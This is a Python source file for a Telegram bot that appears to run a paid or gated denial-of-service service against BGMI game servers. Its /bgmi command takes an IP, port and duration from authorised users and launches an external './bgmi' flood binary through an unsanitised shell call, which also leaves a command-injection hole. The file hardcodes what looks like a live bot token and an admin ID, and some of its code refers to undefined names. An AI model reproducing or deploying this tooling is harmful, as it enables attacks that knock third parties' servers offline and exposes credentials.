#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('6650770569:AAEyA1PlinVMs0RUL9pJ0Xhv9-E4hyfQvzk')

# Admin user IDs
admin_id = ["6272704721"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝙉𝙊 𝙇𝙊𝙂𝙎 𝙁𝙊𝙐𝙉𝘿 ❌."
            else:
                file.truncate(0)
                response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 ✅"
    except FileNotFoundError:
        response = "𝙉𝙊 𝙇𝙊𝙂𝙎 𝙁𝙊𝙐𝙉𝘿."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝙐𝙎𝙀𝙍 {user_to_add} 𝘼𝘿𝘿𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 👍."
            else:
                response = "𝙐𝙎𝙀𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔 𝙀𝙓𝙄𝙎𝙏𝙎 🤦‍♂️."
        else:
            response = "𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙋𝙀𝘾𝙄𝙁𝙔 𝘼 𝙐𝙎𝙀𝙍 𝙄𝘿 𝙏𝙊 𝘼𝘿𝘿 😒."
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 😡."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙐𝙎𝙀𝙍 {user_to_remove} 𝙍𝙀𝙈𝙊𝙑𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 👍."
            else:
                response = f"𝙐𝙎𝙀𝙍 {user_to_remove} 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿 ❌."
        else:
            response = '''𝙎𝙋𝙀𝘾𝙄𝙁𝙔 𝘼 𝙐𝙎𝙀𝙍 𝙄𝘿 𝙏𝙊 𝙍𝙀𝙈𝙊𝙑𝙀'''
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 😡."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 ❌."
                else:
                    file.truncate(0)
                    response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 ✅"
        except FileNotFoundError:
            response = "𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 ❌."
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 😡."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 ❌"
        except FileNotFoundError:
            response = "𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 ❌"
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 😡."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 ❌."
                bot.reply_to(message, response)
        else:
            response = "𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿 ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 😡."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖𝙔𝙊𝙐𝙍 𝙄𝘿: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 ✅"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 100:
                response = "𝙔𝙊𝙐 𝘼𝙍𝙀 𝙊𝙉 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉 𝙋𝙇𝙀𝘼𝙎𝙀 𝙒𝘼𝙄𝙏 100 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ❌."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 480:
                response = "𝙀𝙍𝙍𝙊𝙍 : 𝙏𝙄𝙈𝙀 𝙄𝙉𝙏𝙀𝙍𝙑𝙀𝙇 𝙈𝙐𝙎𝙏 𝘽𝙀 𝙇𝙀𝙎𝙎 𝙏𝙃𝙀𝙉 480."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 🔥"
        else:
            response = "𝙋𝙇𝙀𝘼𝙎𝙀 𝙋𝙍𝙊𝙑𝙄𝘿𝙀 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀> ✅"  # Updated command syntax
    else:
        response = "❌ 𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙎𝙀𝘿 𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 ❌."

    bot.reply_to(message, response)



@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 𝘾𝙊𝙈𝙈𝘼𝙉𝘿
💥 /bgmi : 𝙈𝙀𝙏𝙃𝙊𝘿 𝙁𝙊𝙍 𝘽𝙂𝙈𝙄 𝙎𝙀𝙍𝙑𝙀𝙍
🤖 𝘼𝘿𝙈𝙄𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎
💥 /admincmd : 𝙎𝙃𝙊𝙒 𝘼𝙇𝙇 𝘼𝘿𝙈𝙄𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎.


'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''👋🏻𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙔𝙊𝙐𝙍 𝙃𝙊𝙈𝙀, {user_name}.
🤖𝙏𝙍𝙔 𝙏𝙊 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 : /help '''
    bot.reply_to(message, response)


@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name},𝘼𝘿𝙈𝙄𝙉 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎!!:

💥 /add <userId> : 𝘼𝘿𝘿 𝘼 𝙐𝙎𝙀𝙍 .
💥 /remove <userid> 𝙍𝙀𝙈𝙊𝙑𝙀 𝘼 𝙐𝙎𝙀𝙍.
💥 /allusers : 𝘼𝙇𝙇 𝙐𝙎𝙀𝙍𝙎 𝙇𝙄𝙎𝙏 𝙇𝙊𝙂𝙎.
💥 /logs : 𝘼𝙇𝙇 𝙐𝙎𝙀𝙍𝙎 𝙇𝙊𝙂𝙎.
💥 /broadcast : 𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏 𝘼 𝙈𝙀𝙎𝙎𝘼𝙂𝙀.
💥 /clearlogs : 𝙏𝙊 𝘾𝙇𝙀𝘼𝙍 𝘼𝙇𝙇 𝙇𝙊𝙂𝙎.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝘽𝙔 𝘼𝘿𝙈𝙄𝙉:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"𝙁𝘼𝙄𝙇𝙀𝘿 𝙏𝙊 𝙎𝙀𝙉𝘿 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 {user_id}: {str(e)}")
            response = " 𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝙏 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔  👍."
        else:
            response = "𝙋𝙇𝙀𝘼𝙎𝙀 𝙋𝙍𝙊𝙑𝙄𝘿𝙀 𝘼 𝙈𝙀𝙎𝙎𝘼𝙂𝙀."
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙍𝙐𝙉 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 😡."

    bot.reply_to(message, response)




bot.polling()
